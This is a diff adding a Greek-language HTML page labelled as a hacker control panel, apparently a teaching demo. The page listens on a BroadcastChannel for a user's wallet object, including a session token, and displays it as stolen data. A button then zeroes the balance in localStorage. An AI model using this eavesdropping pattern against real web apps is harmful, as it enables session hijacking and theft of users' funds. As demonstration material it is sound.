@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Πίνακας Ελέγχου Χάκερ</title>
+</head>
+<body>
+  <h2>🕵️ Ιστοσελίδα Κακόβουλου Λογισμικού</h2>
+  <p>Κατάσταση: Αναμονή για υποκλοπή...</p>
+  <div id="stolen-data"></div>
+
+  <br>
+  <!-- Κουμπί που ενεργοποιείται μόλις κλαπούν τα δεδομένα -->
+  <button id="steal-btn" onclick="stealAllMoney()" disabled>
+    💸 Μεταφορά ΟΛΩΝ των χρημάτων στον λογαριασμό μου!
+  </button>
+  <p id="hacker-bank">Ταμείο Χάκερ: 0 euro</p>
+
+  <script>
+    const spyChannel = new BroadcastChannel('hijack_channel');
+    let stolenWallet = null;
+
+    spyChannel.onmessage = function(event) {
+      stolenWallet = event.data;
+      document.getElementById('stolen-data').innerHTML = 
+        `<pre>Υποκλάπηκαν: ${JSON.stringify(stolenWallet, null, 2)}</pre>`;
+      
+      document.getElementById('steal-btn').disabled = false;
+    };
+
+    function stealAllMoney() {
+      if (stolenWallet && stolenWallet.sessionToken === "abcdefghi") {
+        const stolenAmount = stolenWallet.balance;
+        
+        stolenWallet.balance = 0;
+        localStorage.setItem("user_wallet", JSON.stringify(stolenWallet));
+
+        document.getElementById('hacker-bank').innerText = 
+          "Ταμείο Χάκερ: " + stolenAmount + " euro (Κλάπηκαν με το token: " + stolenWallet.sessionToken + ")";
+        
+        alert("Επιτυχία! Κλάπηκαν " + stolenAmount + "€ από τον χρήστη " + stolenWallet.userId);
+      }
+    }
+  </script>
+</body>
+</html>
